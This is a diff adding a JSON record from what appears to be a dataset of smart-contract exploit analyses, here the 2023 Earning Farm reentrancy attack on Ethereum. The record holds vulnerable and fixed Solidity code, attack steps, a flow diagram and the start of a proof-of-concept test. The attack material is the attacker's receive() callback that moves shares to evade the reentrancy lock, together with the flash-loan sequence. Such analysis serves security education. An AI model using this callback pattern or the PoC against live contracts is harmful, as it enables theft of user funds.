@@ -1,0 +1,40 @@
+{
+ "id": "2023__2023-08-09_EarningFarm_Reentrancy_ETH",
+ "source_file": "2023/2023-08-09_EarningFarm_Reentrancy_ETH.md",
+ "title": "Earning Farm — Reentrancy Attack Analysis (2023)",
+ "date": "2023-08-09",
+ "protocol": "Earning Farm",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": "~$286,000 USD (~291 ETH)",
+ "loss_usd": 286000.0,
+ "root_cause": "Reentrancy vulnerability in `withdraw()` due to share burn occurring after external contract call — violation of the CEI pattern",
+ "attack_tx": "0x6e6e...90fa",
+ "vulnerable_contract": "0x863e...9a5e (ENF_ETHLEV) · 0x5655...675d (EFVault)",
+ "classes": [
+  "reentrancy"
+ ],
+ "code_before": [
+  "// ❌ Vulnerability: share burn occurs AFTER external call (withdraw) — CEI pattern violation\nfunction withdraw(\n    uint256 assets,\n    address receiver\n) public virtual nonReentrant unPaused returns (uint256 shares) {\n    // [1] Calculate share ratio held\n    shares = (totalSupply() * assets) / totalAssets();\n\n    // [2] ❌ ETH is transferred to receiver first via external contract (Controller)\n    //     receiver's receive() function executes during this call\n    (uint256 withdrawn, uint256 fee) = IController(controller).withdraw(assets, receiver);\n\n    // [3] ❌ Share burn happens only after ETH transfer — reentrancy has already occurred\n    if (balanceOf(msg.sender) < shares) {\n        shares = balanceOf(msg.sender);  // balance may already be near 0\n    }\n    _burn(msg.sender, shares);  // burn is too late\n}",
+  "// ❌ Vulnerability: nonReentrant only blocks reentrancy within the same contract\n// If the attacker transfers shares to an external contract (Exploiter) in receive()\n// and Exploiter.withdraw() calls ENF_ETHLEV.withdraw() again, the lock is bypassed\n\n// [Attacker contract's receive()]\nreceive() external payable {\n    if (msg.sender == Controller) {\n        // ❌ On ETH receipt — shares transferred to Exploiter contract\n        ENF_ETHLEV.transfer(\n            address(exploiter),\n            ENF_ETHLEV.balanceOf(address(this)) - 1  // transfer all but 1 share\n        );\n        nonce++;\n    }\n}"
+ ],
+ "code_after": [
+  "// ✅ Fix: Apply CEI pattern — state change (share burn) performed before external call\nfunction withdraw(\n    uint256 assets,\n    address receiver\n) public virtual nonReentrant unPaused returns (uint256 shares) {\n    // [1] Calculate share ratio held\n    shares = (totalSupply() * assets) / totalAssets();\n\n    // [2] ✅ Effect first (before external call): burn shares\n    if (balanceOf(msg.sender) < shares) {\n        shares = balanceOf(msg.sender);\n    }\n    _burn(msg.sender, shares);  // burned first — no balance left if reentered\n\n    // [3] ✅ Interaction after state change: transfer ETH\n    (uint256 withdrawn, uint256 fee) = IController(controller).withdraw(assets, receiver);\n}",
+  "// ✅ Fix: Lock share transfers during withdrawal (pool-based separation)\n// Or apply an additional lock that blocks Transfer events while withdraw() is executing\n\n// Method 1: withdrawing flag\nbool private _withdrawing;\n\nmodifier noTransferDuringWithdraw() {\n    require(!_withdrawing, \"transfer locked during withdraw\");\n    _;\n}\n\nfunction withdraw(...) external nonReentrant {\n    _withdrawing = true;\n    // ... logic ...\n    _withdrawing = false;\n}\n\n// ERC20 _transfer override\nfunction _transfer(...) internal override noTransferDuringWithdraw {\n    super._transfer(...);\n}"
+ ],
+ "steps": [
+  "→ uniswapV3FlashCallback() triggered",
+  "[2] WETH.withdraw() — convert WETH → ETH",
+  "→ deposit ETH equal to totalAssets, receive share tokens",
+  "→ Controller → ETH transfer begins",
+  "→ receive() callback triggered (reentrancy point)",
+  "→ shares transferred to Exploiter contract",
+  "→ attacker balance = only 1 share remains",
+  "[9] balanceOf(msg.sender) = 1 → shares recalculated to 1",
+  "→ withdraws shares again even though ETH was already paid out",
+  "[14] WETH.deposit() — convert ETH → WETH"
+ ],
+ "other_code": [
+  "┌─────────────────────────────────────────────────────────────────────┐\n│  Attacker (ContractTest)                                            │\n│  0xFe141C32E36Ba7601D128F0C39DEdBE0F6aBb983                        │\n└──────────────────────────┬──────────────────────────────────────────┘\n                           │\n                           │ [1] flash() — 10,000 WETH flash swap\n                           ▼\n┌─────────────────────────────────────────────────────────────────────┐\n│  Uniswap V3 Pool                                                    │\n│  0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640                        │\n│  → uniswapV3FlashCallback() triggered                               │\n└──────────────────────────┬──────────────────────────────────────────┘\n                           │\n ",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\n// @KeyInfo - Total Lost: ~286K USD\n// Attacker: https://etherscan.io/address/0xee4b3dd20902fa3539706f25005fa51d3b7bdf1b\n// Attack Contract: https://etherscan.io/address/0xfe141c32e36ba7601d128f0c39dedbe0f6abb983\n// Vulnerable Contract: https://etherscan.io/address/0x863e572b215fd67c855d973f870266cf827aea5e\n// Attack Tx: https://etherscan.io/tx/0x6e6e556a5685980317cb2afdb628ed4a845b3cbd1c98bdaffd0561cb2c4790fa\n\ncontract ContractTest is Test {\n    IWFTM WETH = IWFTM(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));\n    // Uniswap V3 USDC/WETH 0.05% pool — flash swap source\n    Uni_Pair_V3 Pair = Uni_Pair_V3(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);\n    // ENF_ETHLEV: leveraged ETH share token contract\n    IENF_ETHLEV EN"
+ ]
+}
